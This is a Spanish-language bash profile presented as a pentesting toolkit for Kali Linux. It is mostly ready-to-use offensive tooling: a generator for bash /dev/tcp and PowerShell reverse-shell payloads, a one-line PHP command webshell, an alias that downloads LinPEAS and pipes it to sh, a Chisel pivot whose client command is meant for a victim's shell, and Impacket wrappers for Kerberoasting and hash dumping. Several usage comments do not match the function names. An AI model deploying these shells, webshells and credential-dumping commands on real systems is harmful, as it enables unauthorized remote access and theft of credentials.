#!/bin/bash
#
#  _   _  ______ ______  _   _   __  __ 
# | \ | ||  ____||  ____|| \ | | |  \/  |
# |  \| || |__   | |__   |  \| | | \  / |
# | . ` ||  __|  |  __|  | . ` | | |\/| |
# | |\  || |____ | |____ | |\  | | |  | |
# |_| \_||______||______||_| \_| |_|  |_|
#
# ARSENAL DE NEENAH v2.1 - PARA KALI LINUX
# Kit de herramientas de shell para operaciones de pentesting.
#

# ===================================================================
# 1. UTILIDADES GENERALES (NAVAJA SUIZA)
# ===================================================================

# Listado de directorios mejorado
alias ll='ls -lAh --color=auto'

# Inicia un servidor web. Uso: serve (usa el puerto 8000) o serve <puerto>
serve() {
    local port="${1:-8000}"
    echo "[+] Sirviendo archivos en http://0.0.0.0:$port ..."
    python3 -m http.server "$port"
}

# Inicia un listener de Netcat verboso en un puerto.
# Uso: listen <puerto> (por defecto usa 443)
listen() {
    local port="${1:-443}"
    echo "[+] Escuchando en el puerto $port..."
    sudo nc -lvnp "$port"
}

# Copia la IP de la interfaz tun0 (o la especificada) al portapapeles.
# Uso: tunip (para tun0) o tunip <interfaz>
tunip() {
    local iface="${1:-tun0}"
    local ip=$(ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -n "$ip" ]; then
        echo -n "$ip" | xclip -sel clip
        echo "[\e[96m$ip\e[0m] copiada al portapapeles."
    else
        echo "[-] Interfaz '$iface' no encontrada o sin IP." >&2
    fi
}

# --- Atajos Rápidos para Puertos Comunes ---
alias listen4444='sudo nc -lvnp 4444'   # Listener instantáneo en el puerto 4444
alias serve80='sudo python3 -m http.server 80'      # Servidor web en puerto 80 (requiere sudo)
alias serve8000='python3 -m http.server 8000' # Servidor web en puerto 8000


# ===================================================================
# 2. RECONOCIMIENTO Y ENUMERACIÓN
# ===================================================================

# Escáner Nmap versátil que organiza los resultados.
# Uso: scan <IP> [argumentos_de_nmap]
scan() {
    if [ $# -eq 0 ]; then echo "[i] Uso: scan <IP> [args_nmap]"; return 1; fi
    local target=$1; shift; mkdir -p "$target/nmap"; 
    echo "[+] Escaneando $target...";
    sudo nmap -sC -sV -T4 --min-rate 5000 -v -oN "$target/nmap/scan.nmap" "$target" "$@";
    echo "[+] Escaneo guardado en $target/nmap/scan.nmap";
}

# Descarga y ejecuta LinPEAS en memoria para enumeración de Linux.
# Uso: enumlinux
alias enumlinux="curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"


# ===================================================================
# 3. ACCESO Y POST-EXPLOTACIÓN
# ===================================================================

# Generador de Reverse Shells para copiar y pegar.
# Uso: revshell <tipo> <ip> <puerto>
# Tipos soportados: bash, powershell
revshell() {
    local type=$1; local ip=$2; local port=$3; local payload="";
    case $type in
        bash) payload="bash -i >& /dev/tcp/$ip/$port 0>&1";;
        powershell) payload="powershell -nop -c \\\"\$client=New-Object System.Net.Sockets.TCPClient('$ip',$port);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\\\"";;
        *) echo "[-] Tipos soportados: bash, powershell"; return 1;;
    esac
    echo "$payload" | xclip -sel clip
    echo "[\e[96m$type\e[0m] reverse shell para $ip:$port copiada al portapapeles."
}

# Estabilización de una TTY básica.
stabilize() {
    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" | xclip -sel clip
    echo "[+] Comando PTY copiado. Recuerda la secuencia: Ctrl+Z -> 'stty raw -echo; fg' -> reset"
}

# Crea un webshell PHP simple en el directorio actual.
# Uso: phpcmd
alias phpcmd='echo "<?php system(\$_GET[\"cmd\"]); ?>" > cmd.php && echo "[+] Webshell creado: cmd.php?cmd=whoami"'


# ===================================================================
# 4. PIVOTING Y MOVIMIENTO LATERAL
# ===================================================================

# Gestor de túneles Chisel.
# Uso: pivot <server|client> [ip_servidor] [puerto]
pivot() {
    # Define la ruta a tu binario de Chisel aquí o usa una variable de entorno.
    local tool_path="${CHISEL_PATH:-~/tools/chisel}"
    if [ ! -f "$tool_path" ]; then echo "[-] Binario de Chisel no encontrado en $tool_path. Define la variable CHISEL_PATH."; return 1; fi
    
    local mode=$1; local remote_ip=$2; local port=${3:-8888};
    if [ "$mode" == "server" ]; then
        echo "[+] Iniciando servidor Chisel en puerto $port para SOCKS reverso..."
        $tool_path server -p "$port" --reverse --socks5
    elif [ "$mode" == "client" ]; then
        if [ -z "$remote_ip" ]; then echo "[-] Se necesita la IP del servidor."; return 1; fi
        local cmd="$tool_path client $remote_ip:$port R:socks"
        echo "$cmd" | xclip -sel clip
        echo "[+] Comando de cliente Chisel copiado. Pégalo en la shell de la víctima."
    else
        echo "[i] Uso: pivot <server|client> [ip_servidor] [puerto]"
    fi
}


# ===================================================================
# 5. ACTIVE DIRECTORY
# ===================================================================

# AS-REP Roasting rápido con Impacket.
# Uso: asrep <IP_DC> <dominio.local>
impacket-asrep() {
    impacket-GetNPUsers -dc-ip $1 -request -format hashcat -outputfile asrep_hashes.txt $2/
}

# Kerberoasting rápido con Impacket.
# Uso: keroast <IP_DC> <dominio/usuario:contraseña>
impacket-kerberoast() {
    impacket-GetUserSPNs -dc-ip $1 -request -format hashcat -outputfile kerberoast_hashes.txt $2
}

# Dumpear hashes con SecretsDump.
# Uso: secretsdump <dominio>/<usuario:contraseña>@<IP_objetivo>
impacket-secrets() {
    impacket-secretsdump -just-dc-user $1 $2
}


echo -e "\n[\e[92m+\e[0m] Arsenal de Neenah v2.1 cargado. Herramientas listas para operar."